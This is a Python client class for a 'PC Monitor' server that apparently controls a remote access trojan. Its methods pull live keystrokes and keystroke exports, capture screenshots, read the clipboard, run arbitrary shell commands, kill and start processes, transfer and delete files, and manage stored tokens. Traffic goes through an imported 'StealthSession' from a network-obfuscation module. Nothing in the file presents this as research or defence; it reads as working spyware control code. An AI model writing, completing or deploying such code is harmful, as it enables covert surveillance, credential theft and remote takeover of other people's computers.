"""
API Client - Handles communication with server
Wraps all API calls with error handling and authentication
"""

import requests
from typing import Optional, Dict, Any, List
from server_modules.network_obfuscation import StealthSession


class APIClient:
    """
    Client for communicating with PC Monitor server
    Handles authentication and request/response parsing
    """

    def __init__(self, server_url: str, api_key: str, timeout: int = 10):
        """
        Initialize API client
        
        Args:
            server_url: Base URL of server (e.g., http://192.168.0.48:5000)
            api_key: API key for authentication
            timeout: Request timeout in seconds
        """
        self.server_url = server_url.rstrip('/')
        self.api_key = api_key
        self.timeout = timeout
        self.session = StealthSession(api_key)

    def _make_request(self, method: str, endpoint: str, **kwargs) -> Optional[Dict[Any, Any]]:
        """
        Make HTTP request with error handling
        
        Args:
            method: HTTP method (GET, POST, etc.)
            endpoint: API endpoint (e.g., /api/status)
            **kwargs: Additional arguments for requests
            
        Returns:
            Response JSON or None on error
        """
        try:
            url = f"{self.server_url}{endpoint}"
            kwargs.setdefault('timeout', self.timeout)
            
            response = self.session.request(method, url, **kwargs)
            
            if response.status_code == 200:
                return response.json()
            else:
                print(f"API Error: {response.status_code} - {endpoint}")
                return None
                
        except requests.exceptions.Timeout:
            print(f"Timeout connecting to {endpoint}")
            return None
        except requests.exceptions.ConnectionError:
            print(f"Connection error to {endpoint}")
            return None
        except Exception as e:
            print(f"Request error: {e}")
            return None

    # Status & Control
    def get_status(self) -> Optional[Dict[str, Any]]:
        """Get server status"""
        return self._make_request('GET', '/api/status')

    def start_monitoring(self) -> Optional[Dict[str, Any]]:
        """Start monitoring on server"""
        return self._make_request('POST', '/api/start')

    def stop_monitoring(self) -> Optional[Dict[str, Any]]:
        """Stop monitoring on server"""
        return self._make_request('POST', '/api/stop')

    def kill_server(self) -> Optional[Dict[str, Any]]:
        """Kill server process (emergency stop)"""
        return self._make_request('POST', '/api/kill')

    # Events
    def get_events(self, limit: int = 100, event_type: str = None, 
                   search: str = None, start_date: str = None, 
                   end_date: str = None) -> Optional[List[Dict[str, Any]]]:
        """
        Get events with optional filtering
        
        Args:
            limit: Maximum number of events
            event_type: Filter by type (e.g., 'key_press', 'mouse_click')
            search: Text search in events
            start_date: Start date filter (ISO format)
            end_date: End date filter (ISO format)
        """
        params = {'limit': limit}
        if event_type:
            params['type'] = event_type
        if search:
            params['search'] = search
        if start_date:
            params['start_date'] = start_date
        if end_date:
            params['end_date'] = end_date
            
        return self._make_request('GET', '/api/events', params=params)

    # Keystrokes
    def get_live_keystrokes(self) -> Optional[Dict[str, Any]]:
        """Get live keystroke stream"""
        return self._make_request('GET', '/api/keystrokes/live')

    def get_keystroke_buffer(self, limit: int = 1000, 
                            format_type: str = 'json') -> Optional[Any]:
        """
        Get keystroke buffer
        
        Args:
            limit: Maximum keystrokes to return
            format_type: 'json' or 'text'
        """
        params = {'limit': limit, 'format': format_type}
        return self._make_request('GET', '/api/keystrokes/buffer', params=params)

    # Screenshots
    def take_snapshot(self) -> Optional[Dict[str, Any]]:
        """Take immediate screenshot"""
        return self._make_request('POST', '/api/snapshot')

    def get_latest_screenshot(self) -> Optional[Dict[str, Any]]:
        """Get latest screenshot as base64"""
        return self._make_request('GET', '/api/screenshot/latest')

    def get_screenshot_history(self) -> Optional[List[Dict[str, Any]]]:
        """Get list of all screenshots"""
        return self._make_request('GET', '/api/screenshot/history')

    def get_screenshot(self, filename: str) -> Optional[Dict[str, Any]]:
        """Get specific screenshot by filename"""
        return self._make_request('GET', f'/api/screenshot/{filename}')

    def update_screenshot_settings(self, enabled: bool = None, 
                                   interval: int = None) -> Optional[Dict[str, Any]]:
        """
        Update automatic screenshot settings
        
        Args:
            enabled: Enable/disable auto screenshots
            interval: Interval in seconds
        """
        data = {}
        if enabled is not None:
            data['enabled'] = enabled
        if interval is not None:
            data['interval'] = interval
            
        return self._make_request('POST', '/api/settings/screenshot', json=data)

    # Remote Commands
    def execute_command(self, cmd_type: str, **kwargs) -> Optional[Dict[str, Any]]:
        """
        Execute remote command
        
        Args:
            cmd_type: Command type ('shutdown', 'restart', 'launch', 'shell')
            **kwargs: Additional command parameters
                - path: For 'launch' command
                - command: For 'shell' command
                - timeout: For 'shell' command
        """
        data = {'type': cmd_type, **kwargs}
        return self._make_request('POST', '/api/command', json=data, timeout=kwargs.get('timeout', 30))

    def shutdown_pc(self) -> Optional[Dict[str, Any]]:
        """Shutdown remote PC"""
        return self.execute_command('shutdown')

    def restart_pc(self) -> Optional[Dict[str, Any]]:
        """Restart remote PC"""
        return self.execute_command('restart')

    def launch_application(self, path: str) -> Optional[Dict[str, Any]]:
        """Launch application on remote PC"""
        return self.execute_command('launch', path=path)

    def execute_shell_command(self, command: str, timeout: int = 30) -> Optional[Dict[str, Any]]:
        """Execute shell command on remote PC"""
        return self.execute_command('shell', command=command, timeout=timeout)

    # Clipboard
    def get_clipboard(self) -> Optional[Dict[str, Any]]:
        """Get clipboard content from remote PC"""
        return self._make_request('GET', '/api/clipboard')

    def set_clipboard(self, content: str) -> Optional[Dict[str, Any]]:
        """Set clipboard content on remote PC"""
        return self._make_request('POST', '/api/clipboard', json={'content': content})

    # Process Management
    def get_processes(self) -> Optional[Dict[str, Any]]:
        """Get list of running processes"""
        return self._make_request('GET', '/api/process')

    def kill_process(self, pid: int) -> Optional[Dict[str, Any]]:
        """Kill process by PID"""
        return self._make_request('POST', '/api/process', 
                                 json={'operation': 'kill', 'pid': pid})

    def start_process(self, command: str) -> Optional[Dict[str, Any]]:
        """Start new process"""
        return self._make_request('POST', '/api/process', 
                                 json={'operation': 'start', 'command': command})

    # File System
    def list_directory(self, path: str) -> Optional[Dict[str, Any]]:
        """List directory contents"""
        return self._make_request('GET', '/api/filesystem', params={'path': path})

    def create_directory(self, path: str) -> Optional[Dict[str, Any]]:
        """Create directory"""
        return self._make_request('POST', '/api/filesystem', 
                                 json={'operation': 'mkdir', 'path': path})

    def delete_path(self, path: str) -> Optional[Dict[str, Any]]:
        """Delete file or directory"""
        return self._make_request('POST', '/api/filesystem', 
                                 json={'operation': 'delete', 'path': path})

    # File Transfer
    def upload_file(self, destination: str, file_content: bytes) -> Optional[Dict[str, Any]]:
        """Upload file to server"""
        import base64
        encoded_content = base64.b64encode(file_content).decode('utf-8')
        return self._make_request('POST', '/api/file', 
                                 json={
                                     'operation': 'upload',
                                     'destination': destination,
                                     'file_content': encoded_content
                                 })

    def download_file(self, source: str) -> Optional[bytes]:
        """Download file from server"""
        result = self._make_request('POST', '/api/file', 
                                   json={'operation': 'download', 'source': source})
        if result and 'file_content' in result:
            import base64
            return base64.b64decode(result['file_content'])
        return None

    # Data Export
    def export_events(self) -> Optional[List[Dict[str, Any]]]:
        """Export all events"""
        return self._make_request('GET', '/api/export', params={'type': 'events'})

    def export_keystrokes(self) -> Optional[List[Dict[str, Any]]]:
        """Export all keystrokes"""
        return self._make_request('GET', '/api/export', params={'type': 'keystrokes'})

    # Token Management (if implemented)
    def get_tokens(self) -> Optional[Dict[str, Any]]:
        """Get stored tokens"""
        return self._make_request('GET', '/api/token')

    def add_token(self, token_data: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Add token"""
        return self._make_request('POST', '/api/token', 
                                 json={'operation': 'add', 'token': token_data})

    def remove_token(self, token_id: str) -> Optional[Dict[str, Any]]:
        """Remove token"""
        return self._make_request('POST', '/api/token', 
                                 json={'operation': 'remove', 'id': token_id})

    def clear_tokens(self) -> Optional[Dict[str, Any]]:
        """Clear all tokens"""
        return self._make_request('POST', '/api/token', 
                                 json={'operation': 'clear'})